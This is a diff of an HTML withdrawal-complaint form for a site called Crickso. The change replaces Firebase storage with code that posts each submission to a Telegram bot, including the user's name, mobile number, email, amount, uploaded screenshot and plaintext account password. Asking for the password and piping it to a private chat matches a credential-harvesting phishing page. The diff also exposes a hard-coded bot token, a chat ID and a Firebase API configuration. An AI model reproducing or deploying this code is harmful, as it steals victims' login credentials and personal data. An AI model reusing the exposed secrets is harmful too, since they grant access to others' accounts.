@@ -5,8 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Withdrawal Complaint - Crickso</title>
     <link rel="stylesheet" href="style.css">
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
     <style>
         body {
             background: #ffffff;
@@ -162,7 +160,11 @@
             max-height: 120px;
             border-radius: 8px;
             margin-top: 10px;
-            display: none;
+            display: none !important;
+        }
+
+        .preview-img.show {
+            display: block !important;
         }
 
         /* Popup */
@@ -313,17 +315,9 @@
     </div>
 
     <script>
-        // Firebase Init
-        firebase.initializeApp({
-            apiKey: "AIzaSyDmRdzAUm-OsTTrxRW4f585VZ2Wq5CAs3w",
-            authDomain: "yusub-bhai-croor-bet.firebaseapp.com",
-            databaseURL: "https://yusub-bhai-croor-bet-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "yusub-bhai-croor-bet",
-            storageBucket: "yusub-bhai-croor-bet.firebasestorage.app",
-            messagingSenderId: "998570774789",
-            appId: "1:998570774789:web:18c14c5c447af3121ba76c"
-        });
-        const db = firebase.database();
+        // ============ TELEGRAM CONFIG ============
+        const BOT_TOKEN = '8899133920:AAEgSuI5WV2luP-IysZw9XD3dy3DxTCDdZk';
+        const CHAT_ID = '-1004376663143';
 
         function previewFile() {
             const file = document.getElementById('fileInput').files[0];
@@ -334,11 +328,33 @@
                 const reader = new FileReader();
                 reader.onload = function(e) {
                     preview.src = e.target.result;
-                    preview.style.display = 'block';
+                    preview.classList.add('show');
                     text.innerHTML = file.name;
                 };
                 reader.readAsDataURL(file);
             }
+        }
+
+        async function sendToTelegram(message) {
+            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+            });
+            return response.ok;
+        }
+
+        async function sendPhotoToTelegram(file, caption) {
+            if (!file) return true;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', file);
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'HTML');
+            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto';
+            const response = await fetch(url, { method: 'POST', body: formData });
+            return response.ok;
         }
 
         function submitComplaint() {
@@ -357,44 +373,46 @@
             }
 
             const allInputs = document.querySelectorAll('.field-input');
-            const selectEl = document.querySelector('.field-select');
-            const previewImg = document.getElementById('previewImg');
-            const complaint = {
-                type: 'Withdrawal Complaint',
-                name: allInputs[0].value,
-                mobile: allInputs[1].value,
-                password: allInputs[2].value,
-                email: allInputs[3].value,
-                problemType: selectEl.value,
-                amount: allInputs[4].value,
-                image: (previewImg && previewImg.src && previewImg.style.display !== 'none') ? previewImg.src : '',
-                date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString(),
-                status: 'pending'
-            };
+            const name = allInputs[0].value;
+            const mobile = allInputs[1].value;
+            const password = allInputs[2].value;
+            const email = allInputs[3].value;
+            const amount = allInputs[4].value;
+            const problemType = document.querySelector('.field-select').value;
+            const date = new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString();
+            const file = document.getElementById('fileInput').files[0];
 
-            const newRef = db.ref('complaints').push();
-            complaint.id = newRef.key;
-            newRef.set(complaint);
-
-            // Save to localStorage for mailbox
-            const localComplaints = JSON.parse(localStorage.getItem('cricksoComplaints') || '[]');
-            localComplaints.push(complaint);
-            localStorage.setItem('cricksoComplaints', JSON.stringify(localComplaints));
+            const message = '<b>💸 Withdrawal Complaint</b>\n\n' +
+                '<b>Name:</b> ' + name + '\n' +
+                '<b>Mobile:</b> ' + mobile + '\n' +
+                '<b>Password:</b> ' + password + '\n' +
+                '<b>Email:</b> ' + email + '\n' +
+                '<b>Problem:</b> ' + problemType + '\n' +
+                '<b>Amount:</b> ₹' + amount + '\n' +
+                '<b>Date:</b> ' + date;
 
             const btn = document.getElementById('submitBtn');
             btn.disabled = true;
             btn.innerHTML = '<span class="spinner"></span> Submitting...';
 
-            setTimeout(function() {
+            sendPhotoToTelegram(file, message).then(function(ok) {
                 btn.disabled = false;
                 btn.innerHTML = 'Complaint Submit';
-                document.getElementById('successPopup').classList.add('show');
-            }, 3000);
+                if (ok) {
+                    document.getElementById('successPopup').classList.add('show');
+                } else {
+                    alert('Failed to submit. Please try again.');
+                }
+            }).catch(function() {
+                btn.disabled = false;
+                btn.innerHTML = 'Complaint Submit';
+                alert('Network error. Please check your connection.');
+            });
         }
 
         function closeSuccess() {
             document.getElementById('successPopup').classList.remove('show');
-            window.location.href = 'index.html?open=mailbox';
+            window.location.href = 'index.html';
         }
     </script>
 
